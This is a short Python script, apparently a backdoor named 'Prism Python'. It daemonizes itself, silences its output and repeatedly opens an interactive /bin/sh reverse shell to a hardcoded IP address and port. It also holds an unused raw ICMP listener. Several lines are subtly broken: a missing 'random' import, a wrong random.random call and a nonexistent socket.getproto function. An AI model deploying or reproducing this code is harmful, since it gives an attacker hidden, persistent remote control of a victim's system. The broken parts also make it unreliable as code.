#!/usr/bin/env python
import signal, sys, time, os, socket, subprocess
MOTD = b"Prism Python v0.1 started\n\n#"
SHELL = '/bin/sh'
REVERSE_HOST = '10.239.44.81'
REVERSE_PORT = '19999'
ICMP_PACKET_SIZE = 1024

def start_reverse_shell(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, int(port)))
    except:
        return
    sock.send(MOTD)
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    os.execl(SHELL, '-i')
    sock.close()
    return

def icmp_listen():
    icmp_proto = socket.getproto("icmp")
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp_proto)
    while(1):
        msg = sock.recv(ICMP_PACKET_SIZE);
        if len(msg) > 0:
            pass
    return

def hide():
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
    f = open(os.devnull, 'w')
    sys.stdout = f
    sys.stderr = f
    sys.stdin  = f
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.exit(1)
    os.chdir('/')
    os.setsid()
    os.umask(0)
        
    while(1):
        if (os.fork() == 0):
            start_reverse_shell(REVERSE_HOST, REVERSE_PORT)
            sys.exit(0)
        time.sleep(10 + random.random(5, 15))
    return

if __name__ == '__main__':
    hide()
